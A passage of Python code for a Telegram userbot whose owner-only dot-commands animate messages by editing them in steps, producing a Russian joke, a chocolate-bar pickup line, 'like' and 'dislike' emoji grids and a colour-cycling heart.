        sleep(3)
        msg.edit(f'''      
а..        ''')  
        sleep(3)
        msg.edit(f'''      
т..        ''')  
        sleep(3)
        msg.edit(f'''      
с..        ''')  
        sleep(3)
        msg.edit(f'''      
я..        ''')  
        sleep(2)
        msg.edit(f'''      
за шоколадку        ''')  
        sleep(1)
        msg.edit(f'''      
милку^^        ''')  
        sleep(3)
        msg.edit(f'''      
❤с орешками❤        ''')  
        sleep(2)
        msg.edit(f'''      
💚го?💚        ''')  
        






@app.on_message(filters.command("maslo", prefixes=".") & filters.me)
def betalove(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f"<b>я</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю когда</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю когда волосатые</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю когда волосатые мужики</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю когда волосатые мужики обмазываются</b>")  
        sleep(time)
        msg.edit(f"<b>я люблю когда волосатые мужики обмазываются маслом 🧈</b>")  





@app.on_message(filters.command("like", prefixes=".") & filters.me)
def betaloves(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''      
🟦''')  
        sleep(0.001)
        msg.edit(f'''
🟦🟦''')  
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦🟦🟦🟦🟦''')
        sleep(0.001)
        msg.edit(f'''
🟦🟦🟦🟦🟦🟦🟦🟦
🟦🟦🟦🟦⬜️🟦🟦🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦⬜️⬜️⬜️🟦⬜️🟦
🟦🟦🟦🟦🟦🟦🟦🟦''')
        sleep(5)



@app.on_message(filters.command("dislike", prefixes=".") & filters.me)
def betaloves(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f'''
🟥''')  # 
        sleep(0.001)
        msg.edit(f'''
🟥🟥''')  
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥''')
        sleep(0.001)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥''')
        sleep(1)
        msg.edit(f'''
🈲🈲🈲🈲🈲🈲🈲🈲
🈲🈲⬜️⬜️⬜️🈲⬜️🈲
🈲🈲⬜️⬜️⬜️🈲⬜️🈲
🈲⬜️⬜️⬜️⬜️🈲⬜️🈲
🈲🈲🈲🈲⬜️🈲🈲🈲
🈲🈲🈲🈲🈲🈲🈲🈲''')
        sleep(1)
        msg.edit(f'''
🟥🟥🟥🟥🟥🟥🟥🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥🟥⬜️⬜️⬜️🟥⬜️🟥
🟥⬜️⬜️⬜️⬜️🟥⬜️🟥
🟥🟥🟥🟥⬜️🟥🟥🟥
🟥🟥🟥🟥🟥🟥🟥🟥
''')
        sleep(1)
        msg.edit(f'''
🈲🈲🈲🈲🈲🈲🈲🈲
🈲🈲⬜️⬜️⬜️🈲⬜️🈲
🈲🈲⬜️⬜️⬜️🈲⬜️🈲
🈲⬜️⬜️⬜️⬜️🈲⬜️🈲
🈲🈲🈲🈲⬜️🈲🈲🈲
🈲🈲🈲🈲🈲🈲🈲🈲''')
        sleep(4)


@app.on_message(filters.command("heart", prefixes=".") & filters.me)
def betalove(_, msg):
    time = 0.6
    for i in range(1):
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💜💜🤍💜💜🤍🤍\n🤍💜💜💜💜💜💜💜🤍\n🤍🤍💜💜💜💜💜🤍🤍\n🤍🤍🤍💜💜💜🤍🤍🤍\n🤍🤍🤍🤍💜🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🖤🖤🤍🖤🖤🤍🤍\n🤍🖤🖤🖤🖤🖤🖤🖤🤍\n🤍🤍🖤🖤🖤🖤🖤🤍🤍\n🤍🤍🤍🖤🖤🖤🤍🤍🤍\n🤍🤍🤍🤍🖤🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍❤️❤️🤍❤️❤️🤍🤍\n🤍❤️❤️❤️❤️❤️❤️❤️🤍\n🤍🤍❤️❤️❤️❤️❤️🤍🤍\n🤍🤍🤍❤️❤️❤️🤍🤍🤍\n🤍🤍🤍🤍❤️🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍🧡🧡🤍🧡🧡🤍🤍\n🤍🧡🧡🧡🧡🧡🧡🧡🤍\n🤍🤍🧡🧡🧡🧡🧡🤍🤍\n🤍🤍🤍🧡🧡🧡🤍🤍🤍\n🤍🤍🤍🤍🧡🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💛💛🤍💛💛🤍🤍\n🤍💛💛💛💛💛💛💛🤍\n🤍🤍💛💛💛💛💛🤍🤍\n🤍🤍🤍💛💛💛🤍🤍🤍\n🤍🤍🤍🤍💛🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💚💚🤍💚💚🤍🤍\n🤍💚💚💚💚💚💚💚🤍\n🤍🤍💚💚💚💚💚🤍🤍\n🤍🤍🤍💚💚💚🤍🤍🤍\n🤍🤍🤍🤍💚🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
        msg.edit(f"🤍🤍🤍🤍🤍🤍🤍🤍🤍\n🤍🤍💙💙🤍💙💙🤍🤍\n🤍💙💙💙💙💙💙💙🤍\n🤍🤍💙💙💙💙💙🤍🤍\n🤍🤍🤍💙💙💙🤍🤍🤍\n🤍🤍🤍🤍💙🤍🤍🤍🤍\n🤍🤍🤍🤍🤍🤍🤍🤍🤍\n")  
        sleep(time)
